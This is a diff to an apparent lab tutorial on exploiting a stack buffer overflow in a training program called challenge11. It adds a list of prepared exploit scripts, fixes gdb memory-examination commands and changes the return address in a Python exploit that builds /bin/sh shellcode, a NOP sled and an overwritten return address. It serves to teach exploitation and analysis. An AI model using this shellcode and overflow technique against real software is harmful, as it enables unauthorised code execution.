@@ -11,6 +11,16 @@ python program
 * Implement a fully working exploit
 * Get our static and dynamic analysis skills to the next level
 
+## Prepared Files
+
+There are three files prepared. We work mostly on the main file:
+* challenge11-exploit-skel.py (main exploit skeletton file)
+
+There are also prepared exploits for the program running in gdb, and without gdb:
+* challenge11-exploit-gdb.py
+* challenge11-exploit-final.py
+
+
 ## Source
 
 File: `~/challenges/challenge11/challenge11.c`
@@ -222,9 +232,9 @@ Starting program: /root/challenges/challenge11/challenge11 AAAAAAAA test
 
 Breakpoint 1, 0x080485c3 in handleData ()
 
-(gdb) x/1x $ebp+0x8
+(gdb) x/1xw $ebp+0x8
 0xffffd670:     0xffffd87e
-(gdb) x/4x 0xffffd87e
+(gdb) x/4xw 0xffffd87e
 0xffffd87e:     0x41414141      0x41414141      0x73657400      0x45540074
 ```
 
@@ -275,7 +285,7 @@ shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x5
 buf_size = 64
 offset = 76
 
-ret_addr = "\x36\xd8\xff\xff"
+ret_addr = "\x7e\xd8\xff\xff"
 
 # fill up to 64 bytes
 exploit = "\x90" * (buf_size - len(shellcode))
@@ -341,9 +351,9 @@ Start it from the beginning? (y or n) y
 Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
 
 Breakpoint 1, 0x080485c3 in handleData ()
-(gdb) x/1x $ebp+0x8
+(gdb) x/1xw $ebp+0x8
 0xffffd620:     0xffffd836
-(gdb) x/4x 0xffffd836
+(gdb) x/4xw 0xffffd836
 0xffffd836:     0x90909090      0x90909090      0x90909090      0x90909090
 ```
 
